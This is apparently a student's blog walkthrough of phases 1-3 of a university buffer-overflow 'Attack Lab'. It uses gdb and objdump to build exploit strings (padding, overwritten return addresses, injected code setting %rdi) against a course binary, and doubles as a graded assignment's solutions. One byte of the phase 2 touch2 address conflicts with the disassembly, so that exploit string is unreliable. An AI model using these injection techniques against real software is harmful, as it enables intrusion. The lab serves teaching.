---
date: 2023-10-05 20:01
description: Walkthrough of Attack Lab Phases 1-3 for CSCI 2400 Computer Systems
tags: gdb, reverse-engineering, c++, csci2400, assembly
draft: false 
---

# Attack Lab

## Introduction

Lab 3 for CSCI 2400 @ CU Boulder - Computer Systems

> This assignment involves generating a total of five attacks on two programs having different security vulnerabilities.  The directions for this lab are detailed but not difficult to follow.

Again, I like using objdump to disassemble the code. 

`objdump -d ctarget > dis.txt`

## Phase 1

From the instructions, we know that our task is to get `CTARGET` to execute the code for `touch1` when `getbuf` executes its return statement, rather than returning to `test`

Let us try to look into the `getbuf` from our disassembled code.

```
0000000000402608 <getbuf>:
  402608:	48 83 ec 18          	sub    $0x18,%rsp
  40260c:	48 89 e7             	mov    %rsp,%rdi
  40260f:	e8 95 02 00 00       	call   4028a9 <Gets>
  402614:	b8 01 00 00 00       	mov    $0x1,%eax
  402619:	48 83 c4 18          	add    $0x18,%rsp
  40261d:	c3  
```

```
402608:	48 83 ec 18          	sub    $0x18,%rsp
```

We can see that `0x18` (hex) or `24` (decimal) bytes of buffer is allocated to `getbuf` (Since, 24 bytes are being subtracted from the stack pointer).


Now, since we know the buffer size we can try passing the address of the touch1 function.

```bash
jxxxan@jupyter-xxxxxx8:~/lab3-attacklab-xxxxxxxxuhan/target66$ cat dis.txt | grep touch1
000000000040261e <touch1>:
```

We were told in our recitation that our system was little-endian (so the bytes will be in the reverse order). Otherwise, we can use python to check:

```bash
jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ python -c 'import sys; print(sys.byteorder)'
little
```

We have our padding size and the function we need to call, we can write it in `ctarget.l1.txt`

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
1e 26 40 00 00 00 00 00
```

```bash
jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ ./hex2raw < ctarget.l1.txt | ./ctarget 
Cookie: 0x3e8dee8f
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

## Phase 2

> Phase 2 involves injecting a small amount of code as part of your exploit string.

> Within the file ctarget there is code for a function touch2 having the following C representation:

```c
void touch2(unsigned val)
{
        vlevel = 2;
        if (val == cookie) {
            printf("Touch2!: You called touch2(0x%.8x)\n", val);
            validate(2);
        } else {
            printf("Misfire: You called touch2(0x%.8x)\n", val);
            fail(2);
        }
        exit(0);
}
```

> Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, 
however, you must make it appear to touch2 as if you have passed your cookie as its argument.

> Recall that the first argument to a function is passed in register %rdi

This hint tells us that we need to store the cookie in the rdi register

```asm
movq $0x3e8dee8f,%rdi 
retq
```

To get the byte representation, we need to compile the code and then disassemble it.

```bash
jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ gcc -c phase2.s && objdump -d phase2.o
phase2.s: Assembler messages:
phase2.s: Warning: end of file not at end of a line; newline inserted

phase2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 8f ee 8d 3e    mov    $0x3e8dee8f,%rdi
   7:   c3                      ret    
```

Thus, the byte representation for our asm code is `48 c7 c7 8f ee 8d 3e c3`

We also need to figure out the address to the `%rsp` register. Again, looking at the `getbuf` code

```
0000000000402608 <getbuf>:
  402608:	48 83 ec 18          	sub    $0x18,%rsp
  40260c:	48 89 e7             	mov    %rsp,%rdi
  40260f:	e8 95 02 00 00       	call   4028a9 <Gets>
  402614:	b8 01 00 00 00       	mov    $0x1,%eax
  402619:	48 83 c4 18          	add    $0x18,%rsp
  40261d:	c3                   	ret
```

We need to find the address of `%rsp` after calling `<Gets>` and sending a really long string.

What we are going to do now is to add a break on `getbuf`, and run the program just after it asks us to enter a string and then find the address of `%rsp`

```bash
jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ gdb ./ctarget
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./ctarget...
(gdb) b getbuf
Breakpoint 1 at 0x402608: file buf.c, line 12.
(gdb) run
Starting program: /home/jxxxxn/lab3-attacklab-naxxxan/target66/ctarget 
Cookie: 0x3e8dee8f

Breakpoint 1, getbuf () at buf.c:12
12      buf.c: No such file or directory.
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x0000000000402608 <+0>:     sub    $0x18,%rsp
   0x000000000040260c <+4>:     mov    %rsp,%rdi
   0x000000000040260f <+7>:     call   0x4028a9 <Gets>
   0x0000000000402614 <+12>:    mov    $0x1,%eax
   0x0000000000402619 <+17>:    add    $0x18,%rsp
   0x000000000040261d <+21>:    ret    
End of assembler dump.
(gdb) until *0x402614
Type string:fnaewuilrgchneaisurcngefsiduerxgecnseriuesgcbnr7ewqdt2348dn564q03278g602365bgn34890765bqv470 trq378t4378gwe
getbuf () at buf.c:15
15      in buf.c
(gdb) x/s $rsp
0x55621b40:     "fnaewuilrgchneaisurcngefsiduerxgecnseriuesgcbnr7ewqdt2348dn564q03278g602365bgn34890765bqv470 trq378t4378gwe"
(gdb)
```

So, the address for `%rsp` is `0x55621b40`

Thus, we can set our `ctarget.l2.txt` as:

```
byte representation of ASM code
padding
address of %rsp
address of touch2 function
```

To get the address of `touch2` we can run:

```bash
jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ cat dis.txt | grep touch2
000000000040264e <touch2>:
  402666:       74 2a                   je     402692 <touch2+0x44>
  4026b2:       eb d4                   jmp    402688 <touch2+0x3a>
```

```
48 c7 c7 8f ee 8d 3e c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
40 1b 62 55 00 00 00 00
4e 26 b2 00 00 00 00 00
```

Do note that our required padding is 24 bytes, we are only adding 16 bytes because our asm code is 8 bytes on its own. Our goal is to have a total of 24 bytes in padding, not 8 + 24 bytes, 

```bash
joxxxx@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ ./hex2raw < ctarget.l2.txt | ./ctarget 
Cookie: 0x3e8dee8f
Type string:Touch2!: You called touch2(0x3e8dee8f)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

## Phase 3

> Phase 3 also involves a code injection attack, but passing a string as argument.

> You will need to include a string representation of your cookie in your exploit string. The string should
consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”

> Your injected code should set register %rdi to the address of this string

> When functions hexmatch and strncmp are called, they push data onto the stack, overwriting
portions of memory that held the buffer used by getbuf. As a result, you will need to be careful
where you place the string representation of your cookie.

Because `hexmatch` and `strncmp` might overwrite the buffer allocated for `getbuf` we will try to store the data after the function `touch3` itself.

The rationale is simple: by the time our payload is executed, we will be setting `%rdi` to point to the cookie. Placing the cookie after `touch3` function ensures that it will not be overwritten by the function calls. It also means that we can calculate the address of the cookie with relative ease, based on the known offsets.

=> The total bytes before the cookie = Buffer (0x18 in our case) + Return Address of %rsp (8 bytes) + Touch 3 (8 Bytes) = 0x18 + 8 + 8 = 28 (hex)

* Return Address (8 Bytes): Since in a 64 bit system the return address is always 8 bytes, by overwriting this address, we redirect the function to jump to our desired location upon returning (e.g. the beginning of the `touch3` function)
* Touch 3 (8 bytes): The address of the `touch3` function is 8 bytes long.

We can use our address for `%rsp` from phase 2, and simply add `0x28` to it.

=> `0x55621b40` + `0x28` = `0x55621B68`

Again, let us get the binary representation for the ASM code:

```asm
movq $0x55621B68, %rdi
retq
```

```bash
jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ gcc -c phase3.s && objdump -d phase3.o
phase3.s: Assembler messages:
phase3.s: Warning: end of file not at end of a line; newline inserted

phase3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 68 1b 62 55    mov    $0x55621b68,%rdi
   7:   c3                      ret
```

Thus, our answer is going to be in the form:

```
asm code
padding
return address / %rsp
touch3 address
cookie string
```

To quickly get the address for `touch3`

```bash
jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ cat dis.txt | grep touch3
0000000000402763 <touch3>:
  402781:       74 2d                   je     4027b0 <touch3+0x4d>
  4027d3:       eb d1                   jmp    4027a6 <touch3+0x43>
```

We need to use an ASCII to Hex converter to convert the cookie string into hex.

```bash
jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ echo -n 3e8dee8f | xxd -p
3365386465653866
```

Thus, our cookie string representation is `33 65 38 64 65 65 38 66`

```
48 c7 c7 68 1B 62 55 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
40 1b 62 55 00 00 00 00
63 27 40 00 00 00 00 00
33 65 38 64 65 65 38 66
```


```bash
jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ ./hex2raw < ctarget.l3.txt | ./ctarget 
Cookie: 0x3e8dee8f
Type string:Touch3!: You called touch3("3e8dee8f")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

Phases 1-3 Complete.
